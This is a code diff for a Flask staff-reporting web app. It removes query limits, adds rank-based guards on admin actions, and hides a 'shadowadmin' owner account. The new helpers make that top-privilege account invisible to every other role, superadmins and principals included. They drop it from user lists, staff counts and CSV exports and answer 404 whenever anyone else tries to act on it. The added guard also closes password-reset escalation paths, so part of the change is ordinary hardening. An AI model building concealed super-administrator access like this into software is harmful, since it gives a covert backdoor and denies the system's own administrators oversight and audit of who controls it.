@@ -175,6 +175,7 @@ ALLOWED_HOSTS = {
 }
 
 RATE_LIMIT_SECONDS = 30
+DASHBOARD_LIST_CAP = 50  # most-recent rows shown on the dashboard; stats are not limited
 LOGIN_RATE_LIMIT_WINDOW = 300
 LOGIN_RATE_LIMIT_MAX = 10
 ACCOUNT_LOCKOUT_THRESHOLD = 5
@@ -560,7 +561,7 @@ def build_dashboard_insights(reports, staff_count=0):
 
 def get_visible_staff_count(db):
     if g.user["role"] in EXECUTIVE_ROLES:
-        row = db.execute("SELECT COUNT(*) AS c FROM users WHERE deleted_at IS NULL AND is_active = 1").fetchone()
+        row = db.execute("SELECT COUNT(*) AS c FROM users WHERE deleted_at IS NULL AND is_active = 1 AND " + hide_shadow_sql()).fetchone()
         return row["c"] if row else 0
     if g.user["role"] == "admin":
         row = db.execute(
@@ -1099,6 +1100,52 @@ def login_required(view):
 ADMIN_ROLES = ("admin", "principal", "superadmin", "shadowadmin")
 SUPER_ROLES = ("superadmin", "shadowadmin")
 EXECUTIVE_ROLES = ("principal", "superadmin", "shadowadmin")
+
+# --- Owner (shadow) account: invisibility + privilege guards ---------------
+# The shadowadmin is the developer/owner break-glass account. It must be
+# invisible to every other role (including superadmins and principals) in all
+# listings and counts, and no other role may act on it or on a peer/superior.
+ROLE_RANK = {"employee": 0, "admin": 2, "principal": 3, "superadmin": 4, "shadowadmin": 5}
+
+
+def _role_of(row):
+    try:
+        return row["role"]
+    except Exception:
+        return row
+
+
+def viewer_is_owner():
+    return bool(getattr(g, "user", None)) and g.user["role"] == "shadowadmin"
+
+
+def hide_shadow_sql(alias="users"):
+    """SQL predicate that drops the owner account from a listing for everyone
+    but the owner. Safe to AND into any query that exposes the users table."""
+    return "1=1" if viewer_is_owner() else "%s.role != 'shadowadmin'" % alias
+
+
+def strip_hidden_users(rows):
+    """Filter the owner account out of an already-fetched user list."""
+    if viewer_is_owner():
+        return rows
+    return [r for r in rows if _role_of(r) != "shadowadmin"]
+
+
+def guard_admin_target(target):
+    """Abort if the current admin may not act on `target`.
+    The owner account is treated as non-existent (404) for anyone but the owner,
+    so an action can never confirm it exists; acting on a peer or higher-ranked
+    account (other than oneself) is forbidden (403). This closes the department
+    and superadmin password-reset escalation paths."""
+    if viewer_is_owner():
+        return
+    if target is None or _role_of(target) == "shadowadmin":
+        abort(404)
+    if target["id"] == g.user["id"]:
+        return
+    if ROLE_RANK.get(_role_of(target), 0) >= ROLE_RANK.get(g.user["role"], 0):
+        abort(403)
 
 
 def admin_required(view):
@@ -1804,7 +1851,7 @@ def dashboard(archived=0):
     archived_expr = archived_filter("reports.archived")
     if g.user["role"] == "employee":
         reports = db.execute(
-            f"SELECT * FROM reports WHERE user_id = ? AND {archived_filter()} = ? ORDER BY report_date DESC, id DESC LIMIT 20",
+            f"SELECT * FROM reports WHERE user_id = ? AND {archived_filter()} = ? ORDER BY report_date DESC, id DESC",
             (g.user["id"], show_archived),
         ).fetchall()
     elif g.user["role"] == "admin":
@@ -1816,7 +1863,6 @@ def dashboard(archived=0):
             JOIN report_access ON report_access.employee_id = reports.user_id
             WHERE report_access.admin_id = ? AND {archived_expr} = ?
             ORDER BY reports.report_date DESC, reports.id DESC
-            LIMIT 40
             """,
             (g.user["id"], show_archived),
         ).fetchall()
@@ -1828,15 +1874,16 @@ def dashboard(archived=0):
             JOIN users ON users.id = reports.user_id
             WHERE {archived_expr} = ?
             ORDER BY reports.report_date DESC, reports.id DESC
-            LIMIT 50
             """,
             (show_archived,),
         ).fetchall()
+    # Stats cover every role-scoped report (no truncation), so "Total Reports"
+    # and every derived rate are accurate; the rendered list is capped for size.
     insights = build_dashboard_insights(reports, get_visible_staff_count(db))
     modules = expansion_modules(insights)
     return render_template(
         "dashboard.html",
-        reports=reports,
+        reports=reports[:DASHBOARD_LIST_CAP],
         show_archived=bool(show_archived),
         insights=insights,
         modules=modules,
@@ -1850,7 +1897,7 @@ def modules():
     archived_expr = archived_filter("reports.archived")
     if g.user["role"] == "employee":
         reports = db.execute(
-            f"SELECT * FROM reports WHERE user_id = ? AND {archived_filter()} = 0 ORDER BY report_date DESC, id DESC LIMIT 100",
+            f"SELECT * FROM reports WHERE user_id = ? AND {archived_filter()} = 0 ORDER BY report_date DESC, id DESC",
             (g.user["id"],),
         ).fetchall()
     elif g.user["role"] == "admin":
@@ -1862,7 +1909,6 @@ def modules():
             JOIN report_access ON report_access.employee_id = reports.user_id
             WHERE report_access.admin_id = ? AND {archived_expr} = 0
             ORDER BY reports.report_date DESC, reports.id DESC
-            LIMIT 150
             """,
             (g.user["id"],),
         ).fetchall()
@@ -1874,7 +1920,6 @@ def modules():
             JOIN users ON users.id = reports.user_id
             WHERE {archived_expr} = 0
             ORDER BY reports.report_date DESC, reports.id DESC
-            LIMIT 200
             """
         ).fetchall()
     insights = build_dashboard_insights(reports, get_visible_staff_count(db))
@@ -1892,17 +1937,16 @@ def principal_overview():
         JOIN users ON users.id = reports.user_id
         WHERE {archived_expr} = 0 AND users.deleted_at IS NULL
         ORDER BY reports.report_date DESC, reports.id DESC
-        LIMIT 500
         """
     ).fetchall()
-    users = db.execute(
+    users = strip_hidden_users(db.execute(
         """
         SELECT id, full_name, department, position, branch, role, is_active, locked_at
         FROM users
         WHERE deleted_at IS NULL
         ORDER BY department ASC, full_name ASC
         """
-    ).fetchall()
+    ).fetchall())
     insights = build_dashboard_insights(reports, get_visible_staff_count(db))
     overview = build_principal_overview(reports, users)
     return render_template("principal.html", insights=insights, overview=overview)
@@ -2149,14 +2193,16 @@ def admin_users():
         is_active = 1 if request.form.get("is_active") == "on" else 0
         if role not in ("employee", "admin", "principal", "superadmin", "shadowadmin"):
             abort(400)
+        target = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
+        guard_admin_target(target)
+        if role == "shadowadmin" and not viewer_is_owner():
+            abort(403)
         db.execute("UPDATE users SET role = ?, is_active = ? WHERE id = ?", (role, is_active, user_id))
         db.commit()
         flash("User updated.", "success")
         return redirect(url_for("admin_users"))
 
-    users = db.execute("SELECT * FROM users WHERE deleted_at IS NULL ORDER BY role DESC, full_name ASC").fetchall()
-    if g.user["role"] != "shadowadmin":
-        users = [u for u in users if u["role"] != "shadowadmin"]
+    users = strip_hidden_users(db.execute("SELECT * FROM users WHERE deleted_at IS NULL ORDER BY role DESC, full_name ASC").fetchall())
     return render_template("admin_users.html", users=users)
 
 
@@ -2167,6 +2213,7 @@ def admin_reset_password(user_id):
     target = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
     if not target:
         abort(404)
+    guard_admin_target(target)
     if request.method == "POST":
         csrf_protect()
         password = request.form.get("password", "")
@@ -2234,6 +2281,7 @@ def admin_unlock(user_id):
     target = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
     if not target:
         abort(404)
+    guard_admin_target(target)
     if request.method == "POST":
         csrf_protect()
         reason = clean_text(request.form.get("reason", ""), 500)
@@ -2257,8 +2305,7 @@ def admin_manage_user(user_id):
     target = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
     if not target:
         abort(404)
-    if target["role"] in ("superadmin", "shadowadmin") and target["id"] != g.user["id"]:
-        abort(403)
+    guard_admin_target(target)
     if request.method == "POST":
         csrf_protect()
         action = request.form.get("action", "")
@@ -2360,10 +2407,10 @@ def admin_department():
             flash("That email address is already registered.", "danger")
         return redirect(url_for("admin_department"))
 
-    users = db.execute(
+    users = strip_hidden_users(db.execute(
         "SELECT * FROM users WHERE department = ? ORDER BY role DESC, full_name ASC",
         (dept,),
-    ).fetchall()
+    ).fetchall())
     return render_template("admin_department.html", dept_users=users, departments=DEPARTMENTS, branches=BRANCHES)
 
 
@@ -2377,6 +2424,7 @@ def admin_department_reset_password(user_id):
     ).fetchone()
     if not target:
         abort(404)
+    guard_admin_target(target)
     if request.method == "POST":
         csrf_protect()
         password = request.form.get("password", "")
@@ -2448,7 +2496,7 @@ def export_csv():
         ).fetchall()
     else:
         rows = db.execute(
-            f"SELECT reports.*, users.full_name FROM reports JOIN users ON users.id = reports.user_id WHERE {archived_expr} = 0 ORDER BY reports.report_date DESC"
+            f"SELECT reports.*, users.full_name FROM reports JOIN users ON users.id = reports.user_id WHERE {archived_expr} = 0 AND {hide_shadow_sql('users')} ORDER BY reports.report_date DESC"
         ).fetchall()
 
     output = io.StringIO()
